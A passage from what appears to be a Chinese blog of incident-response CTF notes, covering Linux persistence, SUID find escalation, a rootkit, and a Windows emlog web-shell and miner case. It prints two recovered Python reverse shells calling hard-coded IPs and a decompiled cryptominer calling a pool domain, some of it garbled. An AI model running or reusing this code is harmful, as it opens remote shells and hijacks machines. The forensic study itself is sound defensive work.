class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">    1.后门程序</span><br><span class="line"></span><br><span class="line">攻击者通常会在受害系统中安装后门程序，以便在需要时重新获得访问权限。常见的后门程序包括：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    2.Rootkit</span><br><span class="line"></span><br><span class="line">Rootkit 是一种能够隐藏自身及其他恶意程序的工具。安装 Rootkit 后，攻击者可以隐藏进程、文件和网络连接，防止被系统管理员发现。</span><br><span class="line"></span><br><span class="line">    内核级 Rootkit：直接修改内核数据结构和函数，隐藏进程、文件和网络连接。</span><br><span class="line">    用户级 Rootkit：通过劫持系统库函数（如 ld_preload），隐藏特定进程和文件。</span><br><span class="line"></span><br><span class="line">    3.持久化机制</span><br><span class="line"></span><br><span class="line">攻击者会使用各种持久化机制，以确保即使系统重启后也能重新获得控制权限。</span><br><span class="line"></span><br><span class="line">    修改启动脚本：在系统启动脚本中加入恶意代码，保证每次系统启动时都会执行。</span><br><span class="line">    crontab 定时任务：在 crontab 中添加恶意任务，定期执行恶意程序。</span><br><span class="line"></span><br><span class="line">    4.文件隐藏</span><br><span class="line"></span><br><span class="line">攻击者会将恶意文件和工具隐藏在系统中，以防被发现。</span><br><span class="line"></span><br><span class="line">    文件名伪装：将恶意文件命名为类似系统文件的名称，如 syslogd、sshd 等。</span><br><span class="line">    隐藏目录：使用隐藏目录（如 . 开头的目录），将恶意文件放置其中。</span><br><span class="line"></span><br><span class="line">    5.网络连接隐藏</span><br><span class="line"></span><br><span class="line">攻击者可能会隐藏与其控制服务器的网络连接，以防被网络管理员发现。</span><br><span class="line"></span><br><span class="line">    端口重定向：使用工具（如 iptables）重定向流量到特定端口，隐藏实际通信端口。</span><br><span class="line">    加密通信：使用加密协议（如 SSH、SSL）进行通信，防止流量被检测和分析。</span><br><span class="line"></span><br><span class="line">    6.日志清除</span><br><span class="line"></span><br><span class="line">攻击者会清除或篡改系统日志，以隐藏入侵痕迹。</span><br><span class="line"></span><br><span class="line">    清除命令历史：删除或篡改 .bash_history 文件。</span><br><span class="line">    修改系统日志：直接修改系统日志文件（如 /var/log 下的日志），删除入侵痕迹。</span><br><span class="line"></span><br><span class="line">    7.使用合法进程</span><br><span class="line"></span><br><span class="line">攻击者会利用合法的系统进程进行恶意活动，以隐藏其行为。</span><br><span class="line"></span><br><span class="line">    进程注入：将恶意代码注入到合法的系统进程中。</span><br><span class="line">    利用系统工具：使用系统自带的工具（如 netcat、curl）进行恶意操作。</span><br><span class="line"></span><br><span class="line">这些权限维持和隐藏技术使得攻击者能够长时间保持对系统的控制权，同时降低被检测和移除的风险。</span><br></pre></td></tr></table></figure>

<h4 id="查看提权命令"><a href="#查看提权命令" class="headerlink" title="查看提权命令"></a>查看提权命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">主要查看系统日志和文件变化记录，查找以下文件可能的变动：</span><br><span class="line"></span><br><span class="line">- `/etc/passwd`</span><br><span class="line">- `/etc/sudoers`</span><br><span class="line">- 具有 `SUID` 位设置的文件。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUID（Set User ID）是 Unix/Linux 文件系统中的一种权限位。当文件的 SUID 位被设置时，执行该文件的用户将临时获得文件所有者的权限。这通常用于程序需要执行一些需要更高权限的操作（例如，ping 命令需要发送 ICMP 请求，因此需要 root 权限）。</span><br></pre></td></tr></table></figure>

<h4 id="find命令带上SUID："><a href="#find命令带上SUID：" class="headerlink" title="find命令带上SUID："></a>find命令带上SUID：</h4><h6 id="find用于在文件系统中搜索文件。它可以根据文件名、类型、大小、修改日期等多种条件来查找文件，并且可以对找到的文件执行各种操作。当find命令配合-exec选项使用时，它允许用户执行指定的命令或脚本。"><a href="#find用于在文件系统中搜索文件。它可以根据文件名、类型、大小、修改日期等多种条件来查找文件，并且可以对找到的文件执行各种操作。当find命令配合-exec选项使用时，它允许用户执行指定的命令或脚本。" class="headerlink" title="find用于在文件系统中搜索文件。它可以根据文件名、类型、大小、修改日期等多种条件来查找文件，并且可以对找到的文件执行各种操作。当find命令配合-exec选项使用时，它允许用户执行指定的命令或脚本。"></a><code>find</code>用于在文件系统中搜索文件。它可以根据文件名、类型、大小、修改日期等多种条件来查找文件，并且可以对找到的文件执行各种操作。当<code>find</code>命令配合<code>-exec</code>选项使用时，它允许用户执行指定的命令或脚本。</h6><h5 id="基本用法示例："><a href="#基本用法示例：" class="headerlink" title="基本用法示例："></a>基本用法示例：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索当前目录及子目录下所有以.txt结尾的文件</span></span><br><span class="line">find . -name <span class="string">&quot;*.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索当前目录及子目录下所有文件并计算文件数量</span></span><br><span class="line">find . -<span class="built_in">type</span> f -<span class="built_in">print</span> | <span class="built_in">wc</span> -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索当前目录及子目录下所有文件并删除它们</span></span><br><span class="line">find . -<span class="built_in">type</span> f -<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<h5 id="具有SUID位的find命令的风险："><a href="#具有SUID位的find命令的风险：" class="headerlink" title="具有SUID位的find命令的风险："></a>具有SUID位的<code>find</code>命令的风险：</h5><h6 id="SUID（Set-User-ID-upon-execution）位是一个特殊的文件权限位，当设置在可执行文件上时，允许该程序以文件所有者的权限运行，而不是以执行该程序的用户权限运行。如果find命令具有SUID位，那么即使它被普通用户执行，它也会以find文件所有者的权限来运行。"><a href="#SUID（Set-User-ID-upon-execution）位是一个特殊的文件权限位，当设置在可执行文件上时，允许该程序以文件所有者的权限运行，而不是以执行该程序的用户权限运行。如果find命令具有SUID位，那么即使它被普通用户执行，它也会以find文件所有者的权限来运行。" class="headerlink" title="SUID（Set User ID upon execution）位是一个特殊的文件权限位，当设置在可执行文件上时，允许该程序以文件所有者的权限运行，而不是以执行该程序的用户权限运行。如果find命令具有SUID位，那么即使它被普通用户执行，它也会以find文件所有者的权限来运行。"></a>SUID（Set User ID upon execution）位是一个特殊的文件权限位，当设置在可执行文件上时，允许该程序以文件所有者的权限运行，而不是以执行该程序的用户权限运行。如果<code>find</code>命令具有SUID位，那么即使它被普通用户执行，它也会以<code>find</code>文件所有者的权限来运行。</h6><h6 id="这意味着，如果find命令配置不当，恶意用户可能会利用它来执行具有更高权限的操作，例如："><a href="#这意味着，如果find命令配置不当，恶意用户可能会利用它来执行具有更高权限的操作，例如：" class="headerlink" title="这意味着，如果find命令配置不当，恶意用户可能会利用它来执行具有更高权限的操作，例如："></a>这意味着，如果<code>find</code>命令配置不当，恶意用户可能会利用它来执行具有更高权限的操作，例如：</h6><ol>
<li><p><strong>覆盖系统文件</strong>：通过<code>-exec</code>选项，用户可以找到特定的系统文件并用恶意内容覆盖它们。</p>
</li>
<li><p><strong>删除重要文件</strong>：用户可以搜索并删除关键的系统或用户文件。</p>
</li>
<li><p><strong>执行恶意脚本</strong>：用户可以利用<code>find</code>来执行具有SUID位的恶意脚本，从而获得更高权限的访问。</p>
</li>
</ol>
<h5 id="安全措施："><a href="#安全措施：" class="headerlink" title="安全措施："></a>安全措施：</h5><ul>
<li><p><strong>不要给<code>find</code>命令设置SUID位</strong>：确保<code>find</code>命令没有设置SUID位，以避免潜在的安全风险。</p>
</li>
<li><p><strong>限制使用</strong>：在多用户系统中，限制对<code>find</code>命令的访问，特别是通过<code>-exec</code>选项的使用。</p>
</li>
<li><p><strong>监控和审计</strong>：监控使用<code>find</code>命令的活动，特别是当它与<code>-exec</code>一起使用时，以检测任何可疑行为。</p>
</li>
<li><p><strong>教育用户</strong>：教育用户关于安全使用命令行工具的重要性，以及潜在的风险。</p>
</li>
</ul>
<h5 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h5><h6 id="假设find命令具有SUID位，一个恶意用户可能会执行以下命令："><a href="#假设find命令具有SUID位，一个恶意用户可能会执行以下命令：" class="headerlink" title="假设find命令具有SUID位，一个恶意用户可能会执行以下命令："></a>假设<code>find</code>命令具有SUID位，一个恶意用户可能会执行以下命令：</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索当前目录及子目录下所有文件，并尝试以root权限执行它们</span></span><br><span class="line">find / -<span class="built_in">type</span> f -<span class="built_in">exec</span> /bin/chown root:root &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p>这个命令会尝试改变系统中所有文件的所有者为root用户，这是一个潜在的危险操作，可能会破坏系统的安全性和稳定性。</p>
<h3 id="解题过程：-3"><a href="#解题过程：-3" class="headerlink" title="解题过程："></a>解题过程：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.黑客隐藏的隐藏的文件 完整路径md5</span><br><span class="line">2.黑客隐藏的文件反弹shell的ip+端口 &#123;ip:port&#125;</span><br><span class="line">3.黑客提权所用的命令 完整路径的md5 flag&#123;md5&#125;</span><br><span class="line">4.黑客尝试注入恶意代码的工具完整路径md5</span><br><span class="line">5.使用命令运行 ./x.xx 执行该文件  将查询的 Exec****** 值 作为flag提交 flag&#123;/xxx/xxx/xxx&#125;</span><br></pre></td></tr></table></figure>

<h4 id="1-5"><a href="#1-5" class="headerlink" title="1."></a>1.</h4><h4 id="使用find-name-来找到隐藏的文件，看到"><a href="#使用find-name-来找到隐藏的文件，看到" class="headerlink" title="使用find / -name &#39;.*&#39;来找到隐藏的文件，看到"></a>使用<code>find / -name &#39;.*&#39;</code>来找到隐藏的文件，看到</h4><p><img src="https://free.picui.cn/free/2025/08/06/68930b0aa7b21.png" alt="1754467093749.png"></p>
<h4 id="tmp通常是放临时文件的目录，-开头的通常是隐藏文件-目录"><a href="#tmp通常是放临时文件的目录，-开头的通常是隐藏文件-目录" class="headerlink" title="tmp通常是放临时文件的目录，.开头的通常是隐藏文件&#x2F;目录"></a>tmp通常是放临时文件的目录，.开头的通常是隐藏文件&#x2F;目录</h4><h4 id="在-tmp-temp-libprocesshider看到libprocesshider-看的出来，内部文件主要是为了隐藏动态链接库进程之类的"><a href="#在-tmp-temp-libprocesshider看到libprocesshider-看的出来，内部文件主要是为了隐藏动态链接库进程之类的" class="headerlink" title="在&#x2F;tmp&#x2F;.temp&#x2F;libprocesshider看到libprocesshider(看的出来，内部文件主要是为了隐藏动态链接库进程之类的)"></a>在&#x2F;tmp&#x2F;.temp&#x2F;libprocesshider看到libprocesshider(看的出来，内部文件主要是为了隐藏动态链接库进程之类的)</h4><p><img src="https://free.picui.cn/free/2025/08/06/68930b0b3313f.png" alt="1754467093750.png"></p>
<h4 id="分析文件1-py"><a href="#分析文件1-py" class="headerlink" title="分析文件1.py"></a>分析文件1.py</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line">import socket,subprocess,os,sys, time</span><br><span class="line"></span><br><span class="line">pidrg = os.fork()</span><br><span class="line">if pidrg &gt; 0:</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">os.chdir(&quot;/&quot;)</span><br><span class="line">os.setsid()</span><br><span class="line">os.umask(0)</span><br><span class="line">drgpid = os.fork()</span><br><span class="line">if drgpid &gt; 0:</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">while 1:</span><br><span class="line">        try:</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                sys.stderr.flush()</span><br><span class="line">                fdreg = open(&quot;/dev/null&quot;, &quot;w&quot;)</span><br><span class="line">                sys.stdout = fdreg</span><br><span class="line">                sys.stderr = fdreg</span><br><span class="line">                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">                sdregs.connect((&quot;114.114.114.121&quot;,9999))</span><br><span class="line">                os.dup2(sdregs.fileno(),0)</span><br><span class="line">                os.dup2(sdregs.fileno(),1)</span><br><span class="line">                os.dup2(sdregs.fileno(),2)</span><br><span class="line">                p=subprocess.call([])</span><br><span class="line">                sdregs.close()</span><br><span class="line">        except Exception:</span><br><span class="line">                pass</span><br><span class="line">        time.sleep(2)</span><br><span class="line">#这段Python脚本是一个反弹shell程序，其目的是创建一个守护进程，连接到远程服务器</span><br></pre></td></tr></table></figure>

<h4 id="shell-py"><a href="#shell-py" class="headerlink" title="shell.py"></a>shell.py</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">from os import dup2</span><br><span class="line">from subprocess import run</span><br><span class="line">import socket</span><br><span class="line">s=socket.socket(socket.AF INET,socket.SOCK STREAM)s.connect((&quot;172.16.10.7&quot;,2220))</span><br><span class="line">dup2(s.fileno(),0)</span><br><span class="line">dup2(s.fileno(),1)</span><br><span class="line">dup2(s.fileno(),2)</span><br><span class="line">run([])</span><br><span class="line">#同样是一个反弹shell程序但是没有守护进程</span><br></pre></td></tr></table></figure>

<h4 id="processhider-c"><a href="#processhider-c" class="headerlink" title="processhider.c"></a>processhider.c</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该文件是用于隐藏某个程序进程的，在这里可以看到，隐藏的是1.py的，就是我们想得</span><br></pre></td></tr></table></figure>

<h4 id="2-4"><a href="#2-4" class="headerlink" title="2."></a>2.</h4><h5 id="脚本分析在另外一个md里面"><a href="#脚本分析在另外一个md里面" class="headerlink" title="脚本分析在另外一个md里面"></a><em>脚本分析在另外一个md里面</em></h5><h4 id="1-py和shell-py都是隐藏文件，1-py是一个更为复杂和健壮的后门脚本，具有错误处理和重连机制，并且能够作为守护进程运行。shell-py则更为简洁，但它没有守护进程的特性，也没有错误处理和重连机制。而且1-py的进程被隐藏了-所以对比之下，1-py才是黑客的攻击的ip"><a href="#1-py和shell-py都是隐藏文件，1-py是一个更为复杂和健壮的后门脚本，具有错误处理和重连机制，并且能够作为守护进程运行。shell-py则更为简洁，但它没有守护进程的特性，也没有错误处理和重连机制。而且1-py的进程被隐藏了-所以对比之下，1-py才是黑客的攻击的ip" class="headerlink" title="1.py和shell.py都是隐藏文件，1.py是一个更为复杂和健壮的后门脚本，具有错误处理和重连机制，并且能够作为守护进程运行。shell.py则更为简洁，但它没有守护进程的特性，也没有错误处理和重连机制。而且1.py的进程被隐藏了,所以对比之下，1.py才是黑客的攻击的ip"></a>1.py和shell.py都是隐藏文件，1.py是一个更为复杂和健壮的后门脚本，具有错误处理和重连机制，并且能够作为守护进程运行。shell.py则更为简洁，但它没有守护进程的特性，也没有错误处理和重连机制。而且1.py的进程被隐藏了,所以对比之下，1.py才是黑客的攻击的ip</h4><h4 id="3-6"><a href="#3-6" class="headerlink" title="3."></a>3.</h4><h5 id="使用find-perm-u-s-type-f-2-dev-null查找系统上所有设置了-SUID-位的文件-看到以下文件设置了SUID位"><a href="#使用find-perm-u-s-type-f-2-dev-null查找系统上所有设置了-SUID-位的文件-看到以下文件设置了SUID位" class="headerlink" title="使用find / -perm -u=s -type f 2&gt;/dev/null查找系统上所有设置了 SUID 位的文件,看到以下文件设置了SUID位"></a>使用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>查找系统上所有设置了 SUID 位的文件,看到以下文件设置了SUID位</h5><h5 id="-12"><a href="#-12" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b0b41669.png" alt="1754467093750.png"></h5><h5 id="我们使用ls-l-usr-bin-find看到"><a href="#我们使用ls-l-usr-bin-find看到" class="headerlink" title="我们使用ls -l /usr/bin/find看到"></a>我们使用<code>ls -l /usr/bin/find</code>看到</h5><h5 id="-13"><a href="#-13" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b0b4cb21.png" alt="1754467093750.png"></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-rwsr-xr-x - 这是文件的权限部分，每个字符有特定的含义：</span><br><span class="line"></span><br><span class="line">第一个字符 - 表示这是一个普通文件。</span><br><span class="line">接下来的三个字符 rws 表示文件所有者的权限。r 代表可读（read），w 代表可写（write），s 代表当执行时设置用户ID（set user ID）。</span><br><span class="line">紧随其后的三个字符 r-x 表示与文件所有者同组的用户的权限。r 代表可读，- 表示不可写，x 代表可执行。</span><br><span class="line">最后三个字符 r-x 表示其他用户的权限，同样是可读和可执行，但不可写。</span><br><span class="line">以及root root表示了文件的所有者都是root</span><br></pre></td></tr></table></figure>

<h5 id="所以这里就是被提权了"><a href="#所以这里就是被提权了" class="headerlink" title="所以这里就是被提权了"></a>所以这里就是被提权了</h5><h4 id="4-5"><a href="#4-5" class="headerlink" title="4."></a>4.</h4><h5 id="黑客使用的工具，我们去查看opt目录，一般这里放着存放可选的、占用空间较大的第三方软件和应用程序"><a href="#黑客使用的工具，我们去查看opt目录，一般这里放着存放可选的、占用空间较大的第三方软件和应用程序" class="headerlink" title="黑客使用的工具，我们去查看opt目录，一般这里放着存放可选的、占用空间较大的第三方软件和应用程序"></a>黑客使用的工具，我们去查看opt目录，一般这里放着存放可选的、占用空间较大的第三方软件和应用程序</h5><p><img src="https://free.picui.cn/free/2025/08/06/68930b0bd3e00.png" alt="1754467093750.png"></p>
<h5 id="opt-cymothoa-1-beta-cymothoa"><a href="#opt-cymothoa-1-beta-cymothoa" class="headerlink" title="&#x2F;opt&#x2F;.cymothoa-1-beta&#x2F;cymothoa"></a>&#x2F;opt&#x2F;.cymothoa-1-beta&#x2F;cymothoa</h5><h4 id="5-3"><a href="#5-3" class="headerlink" title="5."></a>5.</h4><h5 id="（这里我还不太清楚题目的意思，但是好像是找运行1-py的python路径）"><a href="#（这里我还不太清楚题目的意思，但是好像是找运行1-py的python路径）" class="headerlink" title="（这里我还不太清楚题目的意思，但是好像是找运行1.py的python路径）"></a>（这里我还不太清楚题目的意思，但是好像是找运行1.py的python路径）</h5><p><img src="https://free.picui.cn/free/2025/08/06/68930b0d2de97.png" alt="1754467093750.png"></p>
<h1 id="DAY7"><a href="#DAY7" class="headerlink" title="DAY7"></a>DAY7</h1><h2 id="第四章-windows实战-emlog"><a href="#第四章-windows实战-emlog" class="headerlink" title="第四章 windows实战-emlog"></a>第四章 windows实战-emlog</h2><h6 id="做完还不是很明白，不太明白是怎么攻击的"><a href="#做完还不是很明白，不太明白是怎么攻击的" class="headerlink" title="做完还不是很明白，不太明白是怎么攻击的"></a>做完还不是很明白，不太明白是怎么攻击的</h6><h3 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h3><h4 id="http-t-csdnimg-cn-Ohaj9-windows应急"><a href="#http-t-csdnimg-cn-Ohaj9-windows应急" class="headerlink" title="http://t.csdnimg.cn/Ohaj9  windows应急"></a><a target="_blank" rel="noopener" href="http://t.csdnimg.cn/Ohaj9">http://t.csdnimg.cn/Ohaj9</a>  windows应急</h4><h3 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h3><h4 id="1-通过本地-PC-RDP到服务器并且找到黑客植入-shell-将黑客植入-shell-的密码-作为-FLAG-提交"><a href="#1-通过本地-PC-RDP到服务器并且找到黑客植入-shell-将黑客植入-shell-的密码-作为-FLAG-提交" class="headerlink" title="1.通过本地 PC RDP到服务器并且找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;"></a>1.通过本地 PC RDP到服务器并且找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;</h4><h5 id="连上远程桌面之后看到phpstudy-就是可以帮我们搭建网站什么的，我们可以去分析一下网站根目录，直接到根目录复制到我们本机里面，D盾扫一下看到了后门"><a href="#连上远程桌面之后看到phpstudy-就是可以帮我们搭建网站什么的，我们可以去分析一下网站根目录，直接到根目录复制到我们本机里面，D盾扫一下看到了后门" class="headerlink" title="连上远程桌面之后看到phpstudy,就是可以帮我们搭建网站什么的，我们可以去分析一下网站根目录，直接到根目录复制到我们本机里面，D盾扫一下看到了后门"></a>连上远程桌面之后看到phpstudy,就是可以帮我们搭建网站什么的，我们可以去分析一下网站根目录，直接到根目录复制到我们本机里面，D盾扫一下看到了后门</h5><h5 id="-14"><a href="#-14" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b0e2e78b.png" alt="1754467093750.png"></h5><h5 id="-15"><a href="#-15" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b0dae5cd.png" alt="1754467093750.png"></h5><h5 id="-16"><a href="#-16" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b0eb9dda.png" alt="1754467093750.png"></h5><h4 id="2-通过本地-PC-RDP到服务器并且分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交"><a href="#2-通过本地-PC-RDP到服务器并且分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交" class="headerlink" title="2.通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;"></a>2.通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</h4><h5 id="分析攻击者ip-可以去看访问日志，这里是用apache开的服务，因为Nginx下我没看到日志，黑客是上传了个shell-php利用这个后门-直接在日志搜shell就能看到"><a href="#分析攻击者ip-可以去看访问日志，这里是用apache开的服务，因为Nginx下我没看到日志，黑客是上传了个shell-php利用这个后门-直接在日志搜shell就能看到" class="headerlink" title="分析攻击者ip,可以去看访问日志，这里是用apache开的服务，因为Nginx下我没看到日志，黑客是上传了个shell.php利用这个后门,直接在日志搜shell就能看到"></a>分析攻击者ip,可以去看访问日志，这里是用apache开的服务，因为Nginx下我没看到日志，黑客是上传了个shell.php利用这个后门,直接在日志搜shell就能看到</h5><h5 id="-17"><a href="#-17" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b10058a8.png" alt="1754467093751.png"></h5><h4 id="3-通过本地-PC-RDP到服务器并且分析黑客的隐藏账户名称-将黑客隐藏账户名称作为-FLAG-提交"><a href="#3-通过本地-PC-RDP到服务器并且分析黑客的隐藏账户名称-将黑客隐藏账户名称作为-FLAG-提交" class="headerlink" title="3.通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;"></a>3.通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;</h4><h5 id="在C盘下的用户这里就能看到"><a href="#在C盘下的用户这里就能看到" class="headerlink" title="在C盘下的用户这里就能看到"></a>在C盘下的用户这里就能看到</h5><h5 id="-18"><a href="#-18" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b1030d89.png" alt="1754467093751.png"></h5><h5 id="-19"><a href="#-19" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b10dee9c.png" alt="1754467093751.png"></h5><h5 id="-20"><a href="#-20" class="headerlink" title=""></a></h5><h5 id="但是好像是用eventvwr-msc去看windows日志，然后分析来着"><a href="#但是好像是用eventvwr-msc去看windows日志，然后分析来着" class="headerlink" title="但是好像是用eventvwr.msc去看windows日志，然后分析来着"></a>但是好像是用eventvwr.msc去看windows日志，然后分析来着</h5><h4 id="4-通过本地-PC-RDP到服务器并且分析黑客的挖矿程序的矿池域名-将黑客挖矿程序的矿池域名称作为-仅域名-FLAG-提交"><a href="#4-通过本地-PC-RDP到服务器并且分析黑客的挖矿程序的矿池域名-将黑客挖矿程序的矿池域名称作为-仅域名-FLAG-提交" class="headerlink" title="4.通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;"></a>4.通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;</h4><h5 id="点进那个hacker138-看到一个Kuang的exe文件，得知道那个exe文件里面写的是什么，就会用到一个工具，先把exe文件变成pyc文件，然后pyc反编译看到代码"><a href="#点进那个hacker138-看到一个Kuang的exe文件，得知道那个exe文件里面写的是什么，就会用到一个工具，先把exe文件变成pyc文件，然后pyc反编译看到代码" class="headerlink" title="点进那个hacker138$看到一个Kuang的exe文件，得知道那个exe文件里面写的是什么，就会用到一个工具，先把exe文件变成pyc文件，然后pyc反编译看到代码"></a>点进那个hacker138$看到一个Kuang的exe文件，得知道那个exe文件里面写的是什么，就会用到一个工具，先把exe文件变成pyc文件，然后pyc反编译看到代码</h5><p><img src="https://free.picui.cn/free/2025/08/06/68930b1329bb2.png" alt="1754467093751.png"></p>
<h5 id="工具：https-github-com-extremecoders-re-pyinstxtractor"><a href="#工具：https-github-com-extremecoders-re-pyinstxtractor" class="headerlink" title="工具：https://github.com/extremecoders-re/pyinstxtractor"></a>工具：<a target="_blank" rel="noopener" href="https://github.com/extremecoders-re/pyinstxtractor">https://github.com/extremecoders-re/pyinstxtractor</a></h5><h5 id="教程：http-t-csdnimg-cn-9wMUw"><a href="#教程：http-t-csdnimg-cn-9wMUw" class="headerlink" title="教程：http://t.csdnimg.cn/9wMUw"></a>教程：<a target="_blank" rel="noopener" href="http://t.csdnimg.cn/9wMUw">http://t.csdnimg.cn/9wMUw</a></h5><h5 id="得到pyc文件之后然后再反编译，这里我用的在线工具得到"><a href="#得到pyc文件之后然后再反编译，这里我用的在线工具得到" class="headerlink" title="得到pyc文件之后然后再反编译，这里我用的在线工具得到"></a>得到pyc文件之后然后再反编译，这里我用的在线工具得到</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># visit https://tool.lu/pyc/ for more information</span><br><span class="line"># Version: Python 3.8</span><br><span class="line"></span><br><span class="line">import multiprocessing</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def cpu_intensive_task():</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        requests.get(&#x27;http://wakuang.zhigongshanfang.top&#x27;, 10, **(&#x27;timeout&#x27;,))</span><br><span class="line">    finally:</span><br><span class="line">        continue</span><br><span class="line">        continue</span><br><span class="line"></span><br><span class="line">    continue</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    cpu_count = multiprocessing.cpu_count()</span><br><span class="line">    processes = (lambda .0: [])(range(cpu_count))</span><br><span class="line">    for process in processes:</span><br><span class="line">        process.start()</span><br><span class="line">    for process in processes:</span><br><span class="line">        process.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

